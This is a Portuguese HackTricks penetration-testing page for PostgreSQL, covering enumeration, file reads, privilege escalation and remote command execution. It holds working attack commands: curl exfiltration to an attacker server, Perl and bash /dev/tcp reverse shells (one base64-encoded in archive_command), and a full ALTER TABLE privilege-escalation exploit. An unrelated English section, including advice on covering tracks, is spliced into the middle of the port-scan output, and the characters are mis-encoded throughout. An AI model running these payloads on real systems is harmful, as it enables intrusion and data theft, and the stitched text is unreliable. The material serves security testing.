# 5432,5433 - Teste de penetra√ß√£o no PostgreSQL

<figure><img src="../.gitbook/assets/image (3) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

\
Use [**Trickest**](https://trickest.com/?utm\_campaign=hacktrics\&utm\_medium=banner\&utm\_source=hacktricks) para construir facilmente e **automatizar fluxos de trabalho** com as ferramentas comunit√°rias mais avan√ßadas do mundo.\
Acesse hoje:

{% embed url="https://trickest.com/?utm_campaign=hacktrics&utm_medium=banner&utm_source=hacktricks" %}

<details>

<summary><strong>Aprenda hacking na AWS do zero ao her√≥i com</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Outras formas de apoiar o HackTricks:

* Se voc√™ deseja ver sua **empresa anunciada no HackTricks** ou **baixar o HackTricks em PDF**, confira os [**PLANOS DE ASSINATURA**](https://github.com/sponsors/carlospolop)!
* Adquira o [**swag oficial PEASS & HackTricks**](https://peass.creator-spring.com)
* Descubra [**A Fam√≠lia PEASS**](https://opensea.io/collection/the-peass-family), nossa cole√ß√£o exclusiva de [**NFTs**](https://opensea.io/collection/the-peass-family)
* **Junte-se ao** üí¨ [**grupo Discord**](https://discord.gg/hRep4RUj7f) ou ao [**grupo telegram**](https://t.me/peass) ou **siga-nos** no **Twitter** üê¶ [**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
* **Compartilhe seus truques de hacking enviando PRs para os reposit√≥rios** [**HackTricks**](https://github.com/carlospolop/hacktricks) e [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud).

</details>

## **Informa√ß√µes B√°sicas**

O **PostgreSQL** √© descrito como um **sistema de banco de dados objeto-relacional** que √© **open source**. Este sistema n√£o apenas utiliza a linguagem SQL, mas tamb√©m a aprimora com recursos adicionais. Suas capacidades permitem lidar com uma ampla variedade de tipos de dados e opera√ß√µes, tornando-o uma escolha vers√°til para desenvolvedores e organiza√ß√µes.

**Porta padr√£o:** 5432 e, se esta porta j√° estiver em uso, parece que o postgresql usar√° a pr√≥xima porta (5433 provavelmente) que n√£o est√° em uso.
```
PORT     STATE SERVICE
5432/tcp open  pgsql
```
## Conectar & Enumera√ß√£o B√°sica
```bash
psql -U <myuser> # Open psql console with user
psql -h <host> -U <username> -d <database> # Remote connection
psql -h <host> -p <port> -U <username> -W <password> <database> # Remote connection
```

```sql
psql -h localhost -d <database_name> -U <User> #Password will be prompted
\list # List databases
\c <database> # use the database
\d # List tables
\du+ # Get users roles

# Get current user
SELECT user;

# Get current database
SELECT current_catalog;

# List schemas
SELECT schema_name,schema_owner FROM information_schema.schemata;
\dn+

#List databases
SELECT datname FROM pg_database;

#Read credentials (usernames + pwd hash)
SELECT usename, passwd from pg_shadow;

# Get languages
SELECT lanname,lanacl FROM pg_language;

# Show installed extensions
SHOW rds.extensions;
SELECT * FROM pg_extension;

# Get history of commands executed
\s
```
{% hint style="warning" %}
Se ao executar **`\list`** voc√™ encontrar um banco de dados chamado **`rdsadmin`**, voc√™ est√° dentro de um **banco de dados PostgreSQL da AWS**.
{% endhint %}

Para mais informa√ß√µes sobre **como abusar de um banco de dados PostgreSQL**, confira:

{% content-ref url="../pentesting-web/sql-injection/postgresql-injection/" %}
[postgresql-injection](../pentesting-web/sql-injection/postgresql-injection/)
{% endcontent-ref %}

## Enumera√ß√£o Autom√°tica
```
msf> use auxiliary/scanner/postgres/postgres_version
msf> use auxiliary/scanner/postgres/postgres_dbname_flag_injection
```
### [**Brute force**](../generic-methodologies-and-resources/brute-force.md#postgresql)

### **Varredura de portas**

De acordo com [**esta pesquisa**](https://www.exploit-db.com/papers/13084), quando uma tentativa de conex√£o falha, `dblink` lan√ßa uma exce√ß√£o `sqlclient_unable_to_establish_sqlconnection` incluindo uma explica√ß√£o do erro. Abaixo est√£o listados exemplos desses detalhes.
```sql
SELECT * FROM dblink_connect('host=1.2.3.4
port=5678
user=name
password=secret
dbname=abc
connect_timeout=10');
```
* O host est√° inativo

`DETALHE: n√£o foi poss√≠vel conectar ao servidor: Sem rota para o host O servidor est√° em execu√ß√£o no host "1.2.3.4" e aceitando conex√µes TCP/IP na porta 5678?`

* A porta est√° fechada
```
DETAIL:  could not connect to server: Connection refused Is  the  server
running on host "1.2.3.4" and accepting TCP/IP connections on port 5678?
```
* A porta est√° aberta
```
DETAIL:  server closed the connection unexpectedly This  probably  means
the server terminated abnormally before or while processing the request
```
# Pentesting PostgreSQL

## Enumerating PostgreSQL

To identify PostgreSQL services running on a target system, you can use tools like Nmap or Metasploit. Nmap can be used with the following command:

```bash
nmap -sV -p 5432 <target_ip>
```

Metasploit also provides PostgreSQL enumeration modules that can be used to gather information about the database.

## Brute Forcing PostgreSQL

Once PostgreSQL is identified, you can attempt to brute force the database credentials using tools like Metasploit or Hydra. Metasploit provides modules like `postgresql_login` that can be used for this purpose.

Hydra can also be used for brute forcing PostgreSQL with a command like:

```bash
hydra -L <username_list> -P <password_list> <target_ip> postgres
```

## Exploiting PostgreSQL

If you find a vulnerability in the PostgreSQL service, you can exploit it using tools like Metasploit. Metasploit offers modules that can be used to exploit known vulnerabilities in PostgreSQL.

## Post-Exploitation

After gaining access to the PostgreSQL database, you can perform various post-exploitation activities like dumping the database, creating a new user, or executing commands on the underlying system.

## Covering Tracks

To cover your tracks after exploiting PostgreSQL, you can delete logs, remove any backdoors you may have installed, and ensure that there is no evidence of your presence on the system.
```
DETAIL:  FATAL:  password authentication failed for user "name"
```
* A porta est√° aberta ou filtrada
```
DETAIL:  could not connect to server: Connection timed out Is the server
running on host "1.2.3.4" and accepting TCP/IP connections on port 5678?
```
Em fun√ß√µes PL/pgSQL, atualmente n√£o √© poss√≠vel obter detalhes de exce√ß√£o. No entanto, se voc√™ tiver acesso direto ao servidor PostgreSQL, poder√° recuperar as informa√ß√µes necess√°rias. Se extrair nomes de usu√°rio e senhas das tabelas do sistema n√£o for vi√°vel, voc√™ pode considerar utilizar o m√©todo de ataque de lista de palavras discutido na se√ß√£o anterior, pois poderia potencialmente fornecer resultados positivos.

## Enumera√ß√£o de Privil√©gios

### Fun√ß√µes

| Tipos de Fun√ß√£o |                                                                                                                                                      |
| -------------- | ---------------------------------------------------------------------------------------------------------------------------------------------------- |
| rolsuper       | Fun√ß√£o tem privil√©gios de superusu√°rio                                                                                                                        |
| rolinherit     | Fun√ß√£o herda automaticamente os privil√©gios das fun√ß√µes das quais √© membro                                                                                    |
| rolcreaterole  | Fun√ß√£o pode criar mais fun√ß√µes                                                                                                                           |
| rolcreatedb    | Fun√ß√£o pode criar bancos de dados                                                                                                                            |
| rolcanlogin    | Fun√ß√£o pode fazer login. Ou seja, essa fun√ß√£o pode ser fornecida como o identificador de autoriza√ß√£o de sess√£o inicial                                                     |
| rolreplication | Fun√ß√£o √© uma fun√ß√£o de replica√ß√£o. Uma fun√ß√£o de replica√ß√£o pode iniciar conex√µes de replica√ß√£o e criar e excluir slots de replica√ß√£o.                           |
| rolconnlimit   | Para fun√ß√µes que podem fazer login, define o n√∫mero m√°ximo de conex√µes simult√¢neas que essa fun√ß√£o pode fazer. -1 significa sem limite.                                 |
| rolpassword    | N√£o a senha (sempre lida como `********`)                                                                                                        |
| rolvaliduntil  | Tempo de expira√ß√£o da senha (usado apenas para autentica√ß√£o de senha); nulo se n√£o houver expira√ß√£o                                                                  |
| rolbypassrls   | Fun√ß√£o ignora todas as pol√≠ticas de seguran√ßa de n√≠vel de linha, consulte [Se√ß√£o 5.8](https://www.postgresql.org/docs/current/ddl-rowsecurity.html) para mais informa√ß√µes. |
| rolconfig      | Padr√µes espec√≠ficos da fun√ß√£o para vari√°veis de configura√ß√£o em tempo de execu√ß√£o                                                                                          |
| oid            | ID da fun√ß√£o                                                                                                                                           |

#### Grupos Interessantes

* Se voc√™ √© membro de **`pg_execute_server_program`** voc√™ pode **executar** programas
* Se voc√™ √© membro de **`pg_read_server_files`** voc√™ pode **ler** arquivos
* Se voc√™ √© membro de **`pg_write_server_files`** voc√™ pode **escrever** arquivos

{% hint style="info" %}
Observe que no Postgres um **usu√°rio**, um **grupo** e uma **fun√ß√£o** s√£o o **mesmo**. Isso depende apenas de **como voc√™ o utiliza** e se voc√™ **permite o login**.
{% endhint %}
```sql
# Get users roles
\du

#Get users roles & groups
# r.rolpassword
# r.rolconfig,
SELECT
r.rolname,
r.rolsuper,
r.rolinherit,
r.rolcreaterole,
r.rolcreatedb,
r.rolcanlogin,
r.rolbypassrls,
r.rolconnlimit,
r.rolvaliduntil,
r.oid,
ARRAY(SELECT b.rolname
FROM pg_catalog.pg_auth_members m
JOIN pg_catalog.pg_roles b ON (m.roleid = b.oid)
WHERE m.member = r.oid) as memberof
, r.rolreplication
FROM pg_catalog.pg_roles r
ORDER BY 1;

# Check if current user is superiser
## If response is "on" then true, if "off" then false
SELECT current_setting('is_superuser');

# Try to grant access to groups
## For doing this you need to be admin on the role, superadmin or have CREATEROLE role (see next section)
GRANT pg_execute_server_program TO "username";
GRANT pg_read_server_files TO "username";
GRANT pg_write_server_files TO "username";
## You will probably get this error:
## Cannot GRANT on the "pg_write_server_files" role without being a member of the role.

# Create new role (user) as member of a role (group)
CREATE ROLE u LOGIN PASSWORD 'lriohfugwebfdwrr' IN GROUP pg_read_server_files;
## Common error
## Cannot GRANT on the "pg_read_server_files" role without being a member of the role.
```
### Tabelas
```sql
# Get owners of tables
select schemaname,tablename,tableowner from pg_tables;
## Get tables where user is owner
select schemaname,tablename,tableowner from pg_tables WHERE tableowner = 'postgres';

# Get your permissions over tables
SELECT grantee,table_schema,table_name,privilege_type FROM information_schema.role_table_grants;

#Check users privileges over a table (pg_shadow on this example)
## If nothing, you don't have any permission
SELECT grantee,table_schema,table_name,privilege_type FROM information_schema.role_table_grants WHERE table_name='pg_shadow';
```
### Fun√ß√µes
```sql
# Interesting functions are inside pg_catalog
\df * #Get all
\df *pg_ls* #Get by substring
\df+ pg_read_binary_file #Check who has access

# Get all functions of a schema
\df pg_catalog.*

# Get all functions of a schema (pg_catalog in this case)
SELECT routines.routine_name, parameters.data_type, parameters.ordinal_position
FROM information_schema.routines
LEFT JOIN information_schema.parameters ON routines.specific_name=parameters.specific_name
WHERE routines.specific_schema='pg_catalog'
ORDER BY routines.routine_name, parameters.ordinal_position;

# Another aparent option
SELECT * FROM pg_proc;
```
## A√ß√µes no sistema de arquivos

### Ler diret√≥rios e arquivos

A partir deste [**commit**](https://github.com/postgres/postgres/commit/0fdc8495bff02684142a44ab3bc5b18a8ca1863a), membros do grupo definido **`DEFAULT_ROLE_READ_SERVER_FILES`** (chamado **`pg_read_server_files`**) e **super usu√°rios** podem usar o m√©todo **`COPY`** em qualquer caminho (verifique `convert_and_check_filename` em `genfile.c`):
```sql
# Read file
CREATE TABLE demo(t text);
COPY demo from '/etc/passwd';
SELECT * FROM demo;
```
{% hint style="warning" %}
Lembre-se de que se voc√™ n√£o √© um super usu√°rio, mas tem permiss√µes **CREATEROLE**, voc√™ pode **se tornar membro desse grupo:**
```sql
GRANT pg_read_server_files TO username;
```
[**Mais informa√ß√µes.**](pentesting-postgresql.md#privilege-escalation-with-createrole)
{% endhint %}

Existem **outras fun√ß√µes do postgres** que podem ser usadas para **ler arquivos ou listar um diret√≥rio**. Apenas **superusu√°rios** e **usu√°rios com permiss√µes expl√≠citas** podem us√°-las:
```sql
# Before executing these function go to the postgres DB (not in the template1)
\c postgres
## If you don't do this, you might get "permission denied" error even if you have permission

select * from pg_ls_dir('/tmp');
select * from pg_read_file('/etc/passwd', 0, 1000000);
select * from pg_read_binary_file('/etc/passwd');

# Check who has permissions
\df+ pg_ls_dir
\df+ pg_read_file
\df+ pg_read_binary_file

# Try to grant permissions
GRANT EXECUTE ON function pg_catalog.pg_ls_dir(text) TO username;
# By default you can only access files in the datadirectory
SHOW data_directory;
# But if you are a member of the group pg_read_server_files
# You can access any file, anywhere
GRANT pg_read_server_files TO username;
# Check CREATEROLE privilege escalation
```
Pode encontrar **mais fun√ß√µes** em [https://www.postgresql.org/docs/current/functions-admin.html](https://www.postgresql.org/docs/current/functions-admin.html)

### Escrita Simples de Arquivo

Apenas **super usu√°rios** e membros de **`pg_write_server_files`** podem usar a c√≥pia para escrever arquivos.
```sql
copy (select convert_from(decode('<ENCODED_PAYLOAD>','base64'),'utf-8')) to '/just/a/path.exec';
```
{% endcode %}

{% hint style="warning" %}
Lembre-se de que se voc√™ n√£o √© um super usu√°rio, mas tem permiss√µes **`CREATEROLE`**, voc√™ pode **se tornar membro desse grupo:**
```sql
GRANT pg_write_server_files TO username;
```
[**Mais informa√ß√µes.**](pentesting-postgresql.md#privilege-escalation-with-createrole)
{% endhint %}

Lembre-se de que o COPY n√£o pode lidar com caracteres de nova linha, portanto, mesmo se voc√™ estiver usando uma carga √∫til em base64, **voc√™ precisa enviar em uma linha**.\
Uma limita√ß√£o muito importante dessa t√©cnica √© que o **`copy` n√£o pode ser usado para escrever arquivos bin√°rios, pois modifica alguns valores bin√°rios.**

### **Upload de arquivos bin√°rios**

No entanto, existem **outras t√©cnicas para fazer upload de grandes arquivos bin√°rios:**

{% content-ref url="../pentesting-web/sql-injection/postgresql-injection/big-binary-files-upload-postgresql.md" %}
[big-binary-files-upload-postgresql.md](../pentesting-web/sql-injection/postgresql-injection/big-binary-files-upload-postgresql.md)
{% endcontent-ref %}

## <img src="../.gitbook/assets/i3.png" alt="" data-size="original">

**Dica de recompensa por bugs**: **inscreva-se** no **Intigriti**, uma plataforma premium de **recompensas por bugs criada por hackers, para hackers**! Junte-se a n√≥s em [**https://go.intigriti.com/hacktricks**](https://go.intigriti.com/hacktricks) hoje e comece a ganhar recompensas de at√© **$100.000**!

{% embed url="https://go.intigriti.com/hacktricks" %}

## RCE

### **RCE para programa**

Desde a [vers√£o 9.3](https://www.postgresql.org/docs/9.3/release-9-3.html), apenas **super usu√°rios** e membros do grupo **`pg_execute_server_program`** podem usar o copy para RCE (exemplo com exfiltra√ß√£o:
```sql
'; copy (SELECT '') to program 'curl http://YOUR-SERVER?f=`ls -l|base64`'-- -
```
Exemplo de execu√ß√£o:
```bash
#PoC
DROP TABLE IF EXISTS cmd_exec;
CREATE TABLE cmd_exec(cmd_output text);
COPY cmd_exec FROM PROGRAM 'id';
SELECT * FROM cmd_exec;
DROP TABLE IF EXISTS cmd_exec;

#Reverse shell
#Notice that in order to scape a single quote you need to put 2 single quotes
COPY files FROM PROGRAM 'perl -MIO -e ''$p=fork;exit,if($p);$c=new IO::Socket::INET(PeerAddr,"192.168.0.104:80");STDIN->fdopen($c,r);$~->fdopen($c,w);system$_ while<>;''';
```
{% hint style="warning" %}
Lembre-se de que se voc√™ n√£o √© um super usu√°rio, mas tem permiss√µes **`CREATEROLE`**, voc√™ pode **se tornar membro desse grupo:**
```sql
GRANT pg_execute_server_program TO username;
```
### RCE com Linguagens PostgreSQL

{% content-ref url="../pentesting-web/sql-injection/postgresql-injection/rce-with-postgresql-languages.md" %}
[rce-with-postgresql-languages.md](../pentesting-web/sql-injection/postgresql-injection/rce-with-postgresql-languages.md)
{% endcontent-ref %}

### RCE com Extens√µes PostgreSQL

Depois de ter **aprendido** com o post anterior **como carregar arquivos bin√°rios**, voc√™ pode tentar obter **RCE carregando uma extens√£o do PostgreSQL e carregando-a**.

{% content-ref url="../pentesting-web/sql-injection/postgresql-injection/rce-with-postgresql-extensions.md" %}
[rce-with-postgresql-extensions.md](../pentesting-web/sql-injection/postgresql-injection/rce-with-postgresql-extensions.md)
{% endcontent-ref %}

### RCE com arquivo de configura√ß√£o do PostgreSQL

O **arquivo de configura√ß√£o** do PostgreSQL √© **grav√°vel** pelo **usu√°rio postgres**, que √© o que executa o banco de dados, ent√£o como **superusu√°rio** voc√™ pode escrever arquivos no sistema de arquivos e, portanto, pode **sobrescrever este arquivo**.

![](<../.gitbook/assets/image (303).png>)

#### **RCE com ssl\_passphrase\_command**

Mais informa√ß√µes [sobre essa t√©cnica aqui](https://pulsesecurity.co.nz/articles/postgres-sqli).

O arquivo de configura√ß√£o possui alguns atributos interessantes que podem levar a RCE:

- `ssl_key_file = '/etc/ssl/private/ssl-cert-snakeoil.key'` Caminho para a chave privada do banco de dados
- `ssl_passphrase_command = ''` Se o arquivo privado √© protegido por senha (criptografado), o PostgreSQL **executar√° o comando indicado neste atributo**.
- `ssl_passphrase_command_supports_reload = off` **Se** este atributo estiver **ligado**, o **comando** executado se a chave for protegida por senha **ser√° executado** quando `pg_reload_conf()` for **executado**.

Ent√£o, um atacante precisar√°:

1. **Extrair a chave privada** do servidor
2. **Criptografar** a chave privada baixada:
   - `rsa -aes256 -in downloaded-ssl-cert-snakeoil.key -out ssl-cert-snakeoil.key`
3. **Sobrescrever**
4. **Extrair** a **configura√ß√£o** atual do PostgreSQL
5. **Sobrescrever** a **configura√ß√£o** com a configura√ß√£o dos atributos mencionados:
   - `ssl_passphrase_command = 'bash -c "bash -i >& /dev/tcp/127.0.0.1/8111 0>&1"'`
   - `ssl_passphrase_command_supports_reload = on`
6. Executar `pg_reload_conf()`

Ao testar isso, notei que isso s√≥ funcionar√° se o **arquivo da chave privada tiver privil√©gios 640**, for **propriedade de root** e do **grupo ssl-cert ou postgres** (para que o usu√°rio postgres possa l√™-lo) e estiver localizado em _/var/lib/postgresql/12/main_.

#### **RCE com archive\_command**

**Mais** [**informa√ß√µes sobre essa configura√ß√£o e sobre WAL aqui**](https://medium.com/dont-code-me-on-that/postgres-sql-injection-to-rce-with-archive-command-c8ce955cf3d3)**.**

Outro atributo no arquivo de configura√ß√£o que √© explor√°vel √© `archive_command`.

Para isso funcionar, a configura√ß√£o `archive_mode` deve ser `'on'` ou `'always'`. Se isso for verdade, ent√£o poder√≠amos sobrescrever o comando em `archive_command` e for√ß√°-lo a ser executado por meio das opera√ß√µes de WAL (write-ahead logging).

Os passos gerais s√£o:

1. Verificar se o modo de arquivamento est√° ativado: `SELECT current_setting('archive_mode')`
2. Sobrescrever `archive_command` com a carga √∫til. Por exemplo, um shell reverso: `archive_command = 'echo "dXNlIFNvY2tldDskaT0iMTAuMC4wLjEiOyRwPTQyNDI7c29ja2V0KFMsUEZfSU5FVCxTT0NLX1NUUkVBTSxnZXRwcm90b2J5bmFtZSgidGNwIikpO2lmKGNvbm5lY3QoUyxzb2NrYWRkcl9pbigkcCxpbmV0X2F0b24oJGkpKSkpe29wZW4oU1RESU4sIj4mUyIpO29wZW4oU1RET1VULCI+JlMiKTtvcGVuKFNUREVSUiwiPiZTIik7ZXhlYygiL2Jpbi9zaCAtaSIpO307" | base64 --decode | perl'`
3. Recarregar a configura√ß√£o: `SELECT pg_reload_conf()`
4. For√ßar a opera√ß√£o do WAL a ser executada, o que chamar√° o comando de arquivamento: `SELECT pg_switch_wal()` ou `SELECT pg_switch_xlog()` para algumas vers√µes do Postgres

## **Eleva√ß√£o de Privil√©gios no Postgres**

### Eleva√ß√£o de Privil√©gios CREATEROLE

#### **Conceder**

De acordo com a [**documenta√ß√£o**](https://www.postgresql.org/docs/13/sql-grant.html): _Fun√ß√µes com o privil√©gio **`CREATEROLE`** podem **conceder ou revogar a associa√ß√£o a qualquer fun√ß√£o** que **n√£o** seja um **superusu√°rio**._

Portanto, se voc√™ tiver permiss√£o de **`CREATEROLE`**, poder√° conceder a si mesmo acesso a outras **fun√ß√µes** (que n√£o sejam superusu√°rio) que podem lhe dar a op√ß√£o de ler e escrever arquivos e executar comandos:
```sql
# Access to execute commands
GRANT pg_execute_server_program TO username;
# Access to read files
GRANT pg_read_server_files TO username;
# Access to write files
GRANT pg_write_server_files TO username;
```
#### Alterar Senha

Usu√°rios com essa fun√ß√£o tamb√©m podem **alterar** as **senhas** de outros **n√£o-superusu√°rios**:
```sql
#Change password
ALTER USER user_name WITH PASSWORD 'new_password';
```
#### Eleva√ß√£o para SUPERUSER

√â bastante comum encontrar que **usu√°rios locais podem fazer login no PostgreSQL sem fornecer nenhuma senha**. Portanto, uma vez que voc√™ tenha obtido **permiss√µes para executar c√≥digo**, voc√™ pode abusar dessas permiss√µes para obter a fun√ß√£o de **`SUPERUSER`**:
```sql
COPY (select '') to PROGRAM 'psql -U <super_user> -c "ALTER USER <your_username> WITH SUPERUSER;"';
```
{% hint style="info" %}
Isso geralmente √© poss√≠vel por causa das seguintes linhas no arquivo **`pg_hba.conf`**:
```bash
# "local" is for Unix domain socket connections only
local   all             all                                     trust
# IPv4 local connections:
host    all             all             127.0.0.1/32            trust
# IPv6 local connections:
host    all             all             ::1/128                 trust
```
{% endhint %}

### **ALTER TABLE privesc**

No [**este artigo**](https://www.wiz.io/blog/the-cloud-has-an-isolation-problem-postgresql-vulnerabilities) √© explicado como foi poss√≠vel fazer **privesc** no Postgres GCP abusando do privil√©gio ALTER TABLE que foi concedido ao usu√°rio.

Quando voc√™ tenta **tornar outro usu√°rio propriet√°rio de uma tabela**, voc√™ deveria receber um **erro** impedindo isso, mas aparentemente o GCP deu essa **op√ß√£o ao usu√°rio postgres n√£o-superusu√°rio** no GCP:

<figure><img src="../.gitbook/assets/image (4) (1) (1) (1) (2) (1) (1).png" alt=""><figcaption></figcaption></figure>

Unindo essa ideia com o fato de que quando os comandos **INSERT/UPDATE/**[**ANALYZE**](https://www.postgresql.org/docs/13/sql-analyze.html) s√£o executados em uma **tabela com uma fun√ß√£o de √≠ndice**, a **fun√ß√£o** √© **chamada** como parte do comando com as **permiss√µes do propriet√°rio da tabela**. √â poss√≠vel criar um √≠ndice com uma fun√ß√£o e dar permiss√µes de propriet√°rio a um **superusu√°rio** sobre essa tabela e, em seguida, executar ANALYZE sobre a tabela com a fun√ß√£o maliciosa que ser√° capaz de executar comandos porque est√° usando as permiss√µes do propriet√°rio.
```c
GetUserIdAndSecContext(&save_userid, &save_sec_context);
SetUserIdAndSecContext(onerel->rd_rel->relowner,
save_sec_context | SECURITY_RESTRICTED_OPERATION);
```
#### Explora√ß√£o

1. Comece criando uma nova tabela.
2. Insira algum conte√∫do irrelevante na tabela para fornecer dados para a fun√ß√£o de √≠ndice.
3. Desenvolva uma fun√ß√£o de √≠ndice maliciosa que contenha um payload de execu√ß√£o de c√≥digo, permitindo a execu√ß√£o de comandos n√£o autorizados.
4. ALTERE o propriet√°rio da tabela para "cloudsqladmin," que √© a fun√ß√£o de superusu√°rio exclusivamente usada pelo Cloud SQL da GCP para gerenciar e manter o banco de dados.
5. Execute uma opera√ß√£o ANALYZE na tabela. Essa a√ß√£o faz com que o mecanismo do PostgreSQL mude para o contexto de usu√°rio do propriet√°rio da tabela, "cloudsqladmin." Consequentemente, a fun√ß√£o de √≠ndice maliciosa √© chamada com as permiss√µes de "cloudsqladmin," permitindo a execu√ß√£o do comando de shell previamente n√£o autorizado.
```sql
CREATE TABLE temp_table (data text);
CREATE TABLE shell_commands_results (data text);

INSERT INTO temp_table VALUES ('dummy content');

/* PostgreSQL does not allow creating a VOLATILE index function, so first we create IMMUTABLE index function */
CREATE OR REPLACE FUNCTION public.suid_function(text) RETURNS text
LANGUAGE sql IMMUTABLE AS 'select ''nothing'';';

CREATE INDEX index_malicious ON public.temp_table (suid_function(data));

ALTER TABLE temp_table OWNER TO cloudsqladmin;

/* Replace the function with VOLATILE index function to bypass the PostgreSQL restriction */
CREATE OR REPLACE FUNCTION public.suid_function(text) RETURNS text
LANGUAGE sql VOLATILE AS 'COPY public.shell_commands_results (data) FROM PROGRAM ''/usr/bin/id''; select ''test'';';

ANALYZE public.temp_table;
```
Em seguida, a tabela `shell_commands_results` conter√° a sa√≠da do c√≥digo executado:
```
uid=2345(postgres) gid=2345(postgres) groups=2345(postgres)
```
### Login Local

Algumas inst√¢ncias mal configuradas do postgresql podem permitir o login de qualquer usu√°rio local, √© poss√≠vel fazer login local a partir de 127.0.0.1 usando a fun√ß√£o **`dblink`**:
```sql
\du * # Get Users
\l    # Get databases
SELECT * FROM dblink('host=127.0.0.1
port=5432
user=someuser
password=supersecret
dbname=somedb',
'SELECT usename,passwd from pg_shadow')
RETURNS (result TEXT);
```
{% hint style="warning" %}
Note que, para a consulta anterior funcionar, **a fun√ß√£o `dblink` precisa existir**. Se n√£o existir, voc√™ pode tentar cri√°-la com
```sql
CREATE EXTENSION dblink;
```
{% endhint %}

Se voc√™ tiver a senha de um usu√°rio com mais privil√©gios, mas o usu√°rio n√£o tem permiss√£o para fazer login a partir de um IP externo, voc√™ pode usar a seguinte fun√ß√£o para executar consultas como esse usu√°rio:
```sql
SELECT * FROM dblink('host=127.0.0.1
user=someuser
dbname=somedb',
'SELECT usename,passwd from pg_shadow')
RETURNS (result TEXT);
```
√â poss√≠vel verificar se essa fun√ß√£o existe com:
```sql
SELECT * FROM pg_proc WHERE proname='dblink' AND pronargs=2;
```
### Fun√ß√£o definida pelo usu√°rio com SECURITY DEFINER

[Neste artigo](https://www.wiz.io/blog/hells-keychain-supply-chain-attack-in-ibm-cloud-databases-for-postgresql), os pentesters conseguiram obter privil√©gios dentro de uma inst√¢ncia do postgres fornecida pela IBM, porque eles **encontraram esta fun√ß√£o com a flag SECURITY DEFINER**:

<pre class="language-sql"><code class="lang-sql">CREATE OR REPLACE FUNCTION public.create_subscription(IN subscription_name text,IN host_ip text,IN portnum text,IN password text,IN username text,IN db_name text,IN publisher_name text)
RETURNS text
LANGUAGE 'plpgsql'
<strong>    VOLATILE SECURITY DEFINER
</strong>    PARALLEL UNSAFE
COST 100

AS $BODY$
DECLARE
persist_dblink_extension boolean;
BEGIN
persist_dblink_extension := create_dblink_extension();
PERFORM dblink_connect(format('dbname=%s', db_name));
PERFORM dblink_exec(format('CREATE SUBSCRIPTION %s CONNECTION ''host=%s port=%s password=%s user=%s dbname=%s sslmode=require'' PUBLICATION %s',
subscription_name, host_ip, portNum, password, username, db_name, publisher_name));
PERFORM dblink_disconnect();
‚Ä¶
</code></pre>

Como [explicado na documenta√ß√£o](https://www.postgresql.org/docs/current/sql-createfunction.html), uma fun√ß√£o com **SECURITY DEFINER √© executada** com os privil√©gios do **usu√°rio que a possui**. Portanto, se a fun√ß√£o for **vulner√°vel a Inje√ß√£o de SQL** ou estiver realizando **a√ß√µes privilegiadas com par√¢metros controlados pelo atacante**, ela poderia ser abusada para **escalonar privil√©gios dentro do postgres**.

Na linha 4 do c√≥digo anterior, voc√™ pode ver que a fun√ß√£o possui a flag **SECURITY DEFINER**.
```sql
CREATE SUBSCRIPTION test3 CONNECTION 'host=127.0.0.1 port=5432 password=a
user=ibm dbname=ibmclouddb sslmode=require' PUBLICATION test2_publication
WITH (create_slot = false); INSERT INTO public.test3(data) VALUES(current_user);
```
E ent√£o **execute comandos**:

<figure><img src="../.gitbook/assets/image (9) (1).png" alt=""><figcaption></figcaption></figure>

### Realizar For√ßa Bruta com PL/pgSQL

**PL/pgSQL** √© uma **linguagem de programa√ß√£o completa** que oferece maior controle procedural em compara√ß√£o com o SQL. Ele permite o uso de **loops** e outras **estruturas de controle** para aprimorar a l√≥gica do programa. Al√©m disso, **declara√ß√µes SQL** e **triggers** t√™m a capacidade de invocar fun√ß√µes criadas usando a **linguagem PL/pgSQL**. Essa integra√ß√£o permite uma abordagem mais abrangente e vers√°til para programa√ß√£o e automa√ß√£o de banco de dados.\
**Voc√™ pode abusar dessa linguagem para solicitar ao PostgreSQL que fa√ßa for√ßa bruta nas credenciais dos usu√°rios.**

{% content-ref url="../pentesting-web/sql-injection/postgresql-injection/pl-pgsql-password-bruteforce.md" %}
[pl-pgsql-password-bruteforce.md](../pentesting-web/sql-injection/postgresql-injection/pl-pgsql-password-bruteforce.md)
{% endcontent-ref %}

## **POST**
```
msf> use auxiliary/scanner/postgres/postgres_hashdump
msf> use auxiliary/scanner/postgres/postgres_schemadump
msf> use auxiliary/admin/postgres/postgres_readfile
msf> use exploit/linux/postgres/postgres_payload
msf> use exploit/windows/postgres/postgres_payload
```
### registro

Dentro do arquivo _**postgresql.conf**_ voc√™ pode habilitar os logs do postgresql alterando:
```bash
log_statement = 'all'
log_filename = 'postgresql-%Y-%m-%d_%H%M%S.log'
logging_collector = on
sudo service postgresql restart
#Find the logs in /var/lib/postgresql/<PG_Version>/main/log/
#or in /var/lib/postgresql/<PG_Version>/main/pg_log/
```
Ent√£o, **reinicie o servi√ßo**.

### pgadmin

[pgadmin](https://www.pgadmin.org) √© uma plataforma de administra√ß√£o e desenvolvimento para o PostgreSQL.\
Voc√™ pode encontrar **senhas** dentro do arquivo _**pgadmin4.db**_\
Voc√™ pode descriptograf√°-las usando a fun√ß√£o _**decrypt**_ dentro do script: [https://github.com/postgres/pgadmin4/blob/master/web/pgadmin/utils/crypto.py](https://github.com/postgres/pgadmin4/blob/master/web/pgadmin/utils/crypto.py)
```bash
sqlite3 pgadmin4.db ".schema"
sqlite3 pgadmin4.db "select * from user;"
sqlite3 pgadmin4.db "select * from server;"
string pgadmin4.db
```
### pg\_hba

A autentica√ß√£o do cliente no PostgreSQL √© gerenciada por meio de um arquivo de configura√ß√£o chamado **pg_hba.conf**. Este arquivo cont√©m uma s√©rie de registros, cada um especificando um tipo de conex√£o, intervalo de endere√ßos IP do cliente (se aplic√°vel), nome do banco de dados, nome de usu√°rio e o m√©todo de autentica√ß√£o a ser usado para conex√µes correspondentes. O primeiro registro que corresponde ao tipo de conex√£o, endere√ßo do cliente, banco de dados solicitado e nome de usu√°rio √© usado para autentica√ß√£o. N√£o h√° fallback ou backup se a autentica√ß√£o falhar. Se nenhum registro corresponder, o acesso √© negado.

Os m√©todos de autentica√ß√£o baseados em senha dispon√≠veis no pg_hba.conf s√£o **md5**, **crypt** e **password**. Esses m√©todos diferem na forma como a senha √© transmitida: MD5-hashed, criptografada com crypt ou texto simples. √â importante observar que o m√©todo crypt n√£o pode ser usado com senhas que foram criptografadas em pg_authid.

<details>

